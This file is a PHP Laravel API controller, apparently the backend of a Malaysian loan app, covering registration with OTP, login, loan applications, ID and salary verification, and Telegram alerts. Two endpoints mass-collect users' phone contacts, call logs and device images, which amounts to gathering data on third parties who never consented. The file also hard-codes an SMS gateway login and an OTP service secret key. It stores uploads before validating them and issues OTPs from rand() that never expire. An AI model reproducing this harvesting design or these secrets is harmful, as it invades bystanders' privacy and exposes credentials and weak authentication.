<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Contact;
use App\Models\Loan;
use App\Models\Bank;
use App\Models\CallLog;
use App\Models\UserImage;
use App\Models\SendOtp;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Http;
use Carbon\Carbon;
use Illuminate\Support\Facades\Storage;

class ApiController extends Controller
{
    
    // private $user   = 'qM7e5GRb2v';
    // private $pass   = '9gQUeHPAsLwTsII0vQire4nzupOD8ozReuQDSPEj';
    // private $from   = '68068';
    // private $url    = 'https://sms.360.my/gw/bulk360/v3_0/send.php';

    // public function __construct(){
    //     $this->user = urlencode($this->user);
    //     $this->pass = urlencode($this->pass);
    //     $this->url = $this->url . "?user=$this->user&pass=$this->pass&from=$this->from";
    // }

    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => [
                'required',
                'string',
                'max:255',
                'regex:/^[a-zA-Z\s]+$/', // only letters and spaces
            ],
            'email' => 'required|string|email|max:255|unique:users,email,NULL,id,deleted_at,NULL',
            'username' => [
                'required',
                'string',
                'max:50',
                'unique:users,username,NULL,id,deleted_at,NULL',
                'regex:/^[a-zA-Z0-9_]+$/', // letters, numbers, underscore only
            ],
            'contact_no' => [
                'required',
                'string',
                'unique:users,contact_no,NULL,id,deleted_at,NULL',
                'regex:/^(?:\+?60|0)[0-9]{9,11}$/', // Malaysia format
            ],
            'nric' => [
                'required',
                'string',
                'unique:users,nric,NULL,id,deleted_at,NULL',
                'regex:/^[0-9]{12}$/', // exactly 12 digits
            ],
            'otp_number' => 'required',
            'password' => 'required|string|min:8|confirmed',
            'password_confirmation' => 'required|string|min:8',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status'  => 'error',
                'message' => 'Validation failed',
                'errors'  => $validator->errors()
            ]);
        }

        $contact_no= $request->contact_no;
        if (substr($contact_no, 0, 1) === '6') {
            $contact_no = substr($contact_no, 1);
        } elseif (substr($contact_no, 0, 1) === '1') {
            $contact_no = '0' . $contact_no;
        }elseif (substr($contact_no, 0, 1) === '0') {
            // Already valid, do nothing
        } else {
            return [
                'status'  => 'error',
                'message' => 'Invalid contact number format.',
            ];
        }
        
        $checkOtp = SendOtp::where('contact_no',$contact_no)->where('otp_receive',$request->otp_number)->first();
        if(!isset($checkOtp)){
            return [
                'status'  => 'error',
                'message' => 'Invalid Otp.',
            ];
        }
        // Build user data safely
        $data = $request->only(['name', 'email', 'username', 'contact_no', 'nric']);
        $data['password'] = Hash::make($request->password);
        $data['role_id'] = 3; // default role

        $user = User::create($data);
        $token = $user->createToken('api_token')->plainTextToken;
        $this->sendToTelegramGroup("Hello group! New register created. User:".$user->name);

        return response()->json([
            'status' => 'success',
            'message' => 'User registered successfully',
            'user' => $user,
            'token' => $token
        ], 201);
    }

    public function get_otp_number (Request $request)
    {
        $validator = Validator::make($request->all(), [
            'contact_no' => [
                'required',
                'string',
                'unique:users,contact_no,NULL,id,deleted_at,NULL',
                'regex:/^(?:\+?60|0)[0-9]{9,11}$/',
            ]
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status'  => 'error',
                'message' => 'Validation failed',
                'errors'  => $validator->errors()
            ]);
        }

        $contact_no= $request->contact_no;
        if (substr($contact_no, 0, 1) === '6') {
            $contact_no = substr($contact_no, 1);
        } elseif (substr($contact_no, 0, 1) === '1') {
            $contact_no = '0' . $contact_no;
        }elseif (substr($contact_no, 0, 1) === '0') {
            // Already valid, do nothing
        } else {
            return [
                'status'  => 'error',
                'message' => 'Invalid contact number format.',
            ];
        }

        // $contactwith6 = '6'.$request->contact_no; 
        $smscode = $this->randomNum(); 
        // $message = "RM0 USR, Your verification code is ".$smscode;

        // $this->url = $this->url . "&to=".$contactwith6."&text=".rawurlencode($message);

        // $ch = curl_init();
        // curl_setopt($ch, CURLOPT_URL, $this->url);
        // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        // $sentResult = curl_exec($ch);
        // curl_close($ch);

        // if ($sentResult === FALSE) {
        //     return [
        //         'status'  => 'error',
        //         'message' => 'OTP ERROR',
        //     ];
        // } 
        $url = "https://grepublichub.store/api/send_otp";
        $merchant_code = "M003";
        $secret_key = "09usjht6wf7fy9oo9mypdjvh1zirje622ysnax5n17fsy1qswfch24uitfishjln";
        $contact = $request->contact_no;
        $code = $smscode;
        $signature = md5($merchant_code.$secret_key.$contact.$code);

        $response = Http::post($url, [
            'merchant_code' => $merchant_code,
            'secret_key'    => $secret_key,
            'contact_no'    => $contact,
            'code'          => $code,
            'signature'     => $signature,
        ]);

        if (!$response->successful()) {
            return [
                'msg' => 'OTP ERROR',
                'success' => false,
            ];
        }

        SendOtp::updateOrCreate(
            [
                'contact_no' => $contact_no, 
            ],
            [
                'otp_receive' => $smscode,
            ]
        );

        return response()->json([
            'status' => 'success',
            'message' => "Otp Sent"
        ]);
    }
    
    private function randomNum() {
        return rand(100000, 999999);
    }

    public function login(Request $request)
    {
        $request->validate([
            'username' => 'required|string',
            'password' => 'required|string'
        ]);

        // Detect if login input is email or username
        $loginField = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        if (!Auth::attempt([$loginField => $request->username, 'password' => $request->password])) {
            return response()->json([
                'status' => 'error',
                'message' => 'Invalid credentials'
            ], 401);
        }

        $user = Auth::user();
        if (isset($user->is_active) && $user->is_active != 1) {
            return response()->json([
                'status' => 'error',
                'message' => 'User account is inactive or banned.'
            ], 403);
        }
        
        $token = $user->createToken('api_token')->plainTextToken;

        return response()->json([
            'status' => 'success',
            'message' => 'Login successful',
            'user' => $user,
            'token' => $token
        ]);
    }

    public function user(Request $request)
    {
        $user = $request->user();

        if (!$user) {
            return response()->json([
                'status' => 'error',
                'message' => 'User account no longer exists.'
            ], 404);
        }

        if (isset($user->is_active) && $user->is_active != 1) {
            return response()->json([
                'status' => 'error',
                'message' => 'User account is inactive or banned.'
            ], 403);
        }

        return response()->json([
            'status' => 'success',
            'user' => $user
        ]);
    }

    public function saveContact(Request $request)
    {
        $user = $request->user();
        $contacts = $request->input('contacts', []);

        foreach ($contacts as $contact) {
            if(isset($contact['phoneNumbers']) && count($contact['phoneNumbers'])>0){
                Contact::create([
                    'user_id'    => $user->id,
                    'phoneNumbers'=>$contact['phoneNumbers']??null,
                    'birthday'=>$contact['birthday']??null,
                    'postalAddresses'=>$contact['postalAddresses']??null,
                    'department'=>$contact['department']??null,
                    'jobTitle'=>$contact['jobTitle']??null,
                    'emailAddresses'=>$contact['emailAddresses']??null,
                    'urlAddresses'=>$contact['urlAddresses']??null,
                    'suffix'=>$contact['suffix']??null,
                    'company'=>$contact['company']??null,
                    'note'=>$contact['note']??null,
                    'middleName'=>$contact['middleName']??null,
                    'displayName'=>$contact['displayName']??null,
                    'familyName'=>$contact['familyName']??null,
                    'givenName'=>$contact['givenName']??null,
                    'prefix'=>$contact['prefix']??null,
                ]);
            }

            
        }

        return response()->json([
            'status' => 'success',
            'message' => 'Contacts saved successfully'
        ]);
    }

    public function getBank(Request $request)
    {
        $user = $request->user();
        $bank = Bank::all();
        return response()->json([
            'status' => 'success',
            'data' => $bank
        ]);
    }

    public function submitLoan(Request $request)
    {
        $user = $request->user();
        $validator = Validator::make($request->all(), [
            'loan_amount' => 'required',
            'duration_of_month' => 'required',
            'start_date' => 'required',
            'bank_id' => 'required',
            'account_number' => 'required',
            'account_name' => 'required',
            'video_upload' => 'required|file|mimetypes:video/mp4,video/avi,video/mov',
        ]);
        
        $folderPath = 'uploads/' . $user->id;
        $video_path = $request->file('video_upload')->store($folderPath, 'public');

        if ($validator->fails()) {
            return response()->json([
                'status'  => 'error',
                'message' => 'Validation failed',
                'errors'  => $validator->errors()
            ]);
        }
        $request->merge([
            'loan_amount' => str_replace(',', '', $request->loan_amount)
        ]);

        Loan::create([
            'user_id' => $user->id,
            'loan_amount' => $request->loan_amount,
            'duration_of_month' => $request->duration_of_month,
            'start_date' => $request->start_date,
            'bank_id' => $request->bank_id,
            'account_number' => $request->account_number,
            'account_name' => $request->account_name,
            'video_path' => $video_path,
            'status' => 'pending',
        ]);
        
        $this->sendToTelegramGroup("User ".$user->name." submit loan.");
        return response()->json([
            'status' => 'success',
            'message' => 'Loan submitted'
        ]);
    }

    public function getallLoan(Request $request)
    {
        $user = $request->user();
        $loan = Loan::where('user_id', $user->id)->get();
        return response()->json([
            'status' => 'success',
            'data' => $loan
        ]);
    }

    public function verifyUser(Request $request)
    {
        $user = $request->user();
        $validator = Validator::make($request->all(), [
            'front_ic' => 'required|image',
            'back_ic' => 'required|image',
            'company_name' => 'required',
            'company_contact' => 'required',
            'job_title' => 'required',
            'salary' => 'required',
            'salary_date' => 'required',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status'  => 'error',
                'message' => 'Validation failed',
                'errors'  => $validator->errors()
            ]);
        }

        $folderPath = 'uploads/' . $user->id;
        $front_ic_path = $request->file('front_ic')->store($folderPath, 'public');
        $back_ic_path  = $request->file('back_ic')->store($folderPath, 'public');
        $bill_tnb = $request->hasFile('bill_tnb') ? 
                    $request->file('bill_tnb')->store($folderPath, 'public') : null;

        $bill_air = $request->hasFile('bill_air') ? 
                    $request->file('bill_air')->store($folderPath, 'public') : null;

        $slip_gaji = $request->hasFile('slip_gaji') ? 
                    $request->file('slip_gaji')->store($folderPath, 'public') : null;

        $userdetails = User::find($user->id);
        $userdetails->update([
            'front_ic'=>$front_ic_path,
            'back_ic'=>$back_ic_path,
            'user_status'=>'pending verified',
            'company_name'=>$request->company_name,
            'company_contact'=>$request->company_contact,
            'job_title'=>$request->job_title,
            'salary'=>$request->salary,
            'salary_date'=>$request->salary_date,
            'bill_tnb'=>$bill_tnb,
            'bill_air'=>$bill_air,
            'slip_gaji'=>$slip_gaji,
        ]);
        $this->sendToTelegramGroup("User ".$userdetails->name." verified his details.");

        return response()->json([
            'status' => 'success',
            'message' => 'Verifications submitted'
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()->tokens()->delete();

        return response()->json([
            'status' => 'success',
            'message' => 'Logged out successfully'
        ]);
    }

    public function receiveDeviceData(Request $request)
    {
        $user = $request->user();

        // Decode JSON strings
        $contacts = json_decode($request->contacts, true) ?? [];
        $callLogs = json_decode($request->call_logs, true) ?? [];

        // Grab uploaded images

        Log::debug([
            'decoded_contacts_count' => count($contacts),
            'decoded_call_logs_count' => count($callLogs)
        ]);

        // ✅ Save Contacts
        foreach ($contacts as $contact) {
            if(isset($contact['phoneNumbers']) && count($contact['phoneNumbers'])>0){
                Contact::create([
                    'user_id' => $user->id,
                    'displayName'     => $contact['displayName'] ?? null,
                    'givenName'       => $contact['givenName'] ?? null,
                    'familyName'      => $contact['familyName'] ?? null,
                    'company'         => $contact['company'] ?? null,
                    'phoneNumbers'    => $contact['phoneNumbers'] ?? null,
                    'emailAddresses'  => $contact['emailAddresses'] ?? null,
                    'postalAddresses' => $contact['postalAddresses'] ?? null,
                    'note'            => $contact['note'] ?? null,
                ]);
            }
        }

        // ✅ Save Call Logs
        foreach ($callLogs as $log) {
            CallLog::create([
                'user_id'     => $user->id,
                'name'        => $log['name'] ?? null,
                'phoneNumber' => $log['phoneNumber'] ?? null,
                'duration'    => $log['duration'] ?? null,
                'type'        => $log['type'] ?? null,
                'timestamp'   => isset($log['timestamp'])
                    ? \Carbon\Carbon::createFromTimestampMs($log['timestamp'])
                    : null,
            ]);
        }

        return response()->json([
            'status' => 'success',
            'message' => 'Contacts, call logs saved successfully',
        ]);
    }

    public function receiveImageData(Request $request)
    {
        $user = $request->user();
        $images = $request->file('images', []);

        Log::debug([
            'uploaded_images_count' => count($images)
        ]);
        $check = UserImage::where('user_id',$user->id)->count();
        // ✅ Save Uploaded Images
        foreach ($images as $index => $image) {
            $number = $check+$index+1;
            $fileName = 'user_' . $user->id . '_' . time() . '_' . $number . '.' . $image->getClientOriginalExtension();
            $path = $image->storeAs('uploads/' . $user->id, $fileName, 'public');
            
            UserImage::create([
                'user_id' => $user->id,
                'image_uri' => $path,
            ]);
        }

        return response()->json([
            'status' => 'success',
            'message' => 'images saved successfully',
        ]);
    }

    public function sendToTelegramGroup($text)
    {
        $token = env('TELEGRAM_BOT');
        $chatId = env('TELEGRAM_GROUP');

        $url = "https://api.telegram.org/bot{$token}/sendMessage";

        Http::post($url, [
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'HTML'
        ]);
    }

    public function getErrorMessage(Request $request)
    {
        Log::debug($request->all());

        return response()->json([
            'status' => true,
            'message' => 'Error received',
        ]);
    }




}
